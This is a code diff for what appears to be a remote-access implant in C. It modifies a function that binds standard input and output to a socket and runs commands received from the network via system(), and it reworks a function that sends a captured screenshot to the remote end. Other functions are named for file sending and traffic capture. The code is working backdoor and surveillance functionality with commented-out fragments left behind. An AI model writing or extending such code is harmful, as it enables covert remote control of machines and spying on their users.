@@ -26,11 +26,19 @@ void exec_commmand()
 
     if (command_len <= 0) return;
 
+    int new_stdin=dup(0);
+    int new_stdout=dup(1);
+    int new_stderr=dup(2);
+
     dup2(sockfd, 0);
     dup2(sockfd, 1);
     dup2(sockfd, 2);
 
     system(recv_command);
+
+    dup2(new_stdin,0);
+    dup2(new_stdout,1);
+    dup2(new_stderr,2);
 }
 
 void send_file()
@@ -87,25 +95,46 @@ void screenshot_system(int sockfd)
         return;
     }
 
+     
+
     // Send file size first
-    char size_buf[32];
-    snprintf(size_buf, sizeof(size_buf), "%ld", st.st_size);
-    send(sockfd, size_buf, strlen(size_buf), 0);
-    send(sockfd, "\n", 1, 0);
+    // char size_buf[32];
+    // snprintf(size_buf, sizeof(size_buf), "%ld", st.st_size);
+    // send(sockfd, size_buf, strlen(size_buf), 0);
+    // send(sockfd, "\n", 1, 0);
 
     // Send file contents
-    char buffer[MAXLINE];
-    ssize_t bytes_read;
-    while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
-        send(sockfd, buffer, bytes_read, 0);
-    }
 
-    close(fd);
-    send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"), 0);
-    printf("Screenshot sent\n");
+    char buffer[MAXLINE*100];
+
+    struct file_struct file_to_send;
+    strcpy(file_to_send.file_name,"screenshot.png");
+    file_to_send.name_length=strlen(file_to_send.file_name);
+
+    char file_content_buff[MAXLINE*100];
+    file_to_send.file_size = read(fd, file_to_send.file_bytes, MAXLINE*100);
+
+    //strncpy(file_to_send.file_bytes, buffer, file_to_send.file_size);
+
+    write(sockfd, &file_to_send, sizeof(file_to_send));
+
+    printf("sending %d\n",file_to_send.file_size);
+
+    // char buffer[MAXLINE];
+    // ssize_t bytes_read;
+    // int total_read=0;
+    // while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
+    //     send(sockfd, buffer, bytes_read, 0);
+    //     total_read+=bytes_read;
+    // }
+    // printf("screenshot size: %d,\n",total_read);
+
+    // close(fd);
+    // send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"), 0);
+    // printf("Screenshot sent\n");
     
     // Cleanup
-    unlink("/tmp/screenshot.png");
+    //unlink("/tmp/screenshot.png");
 }
 
 void capturetraffic()
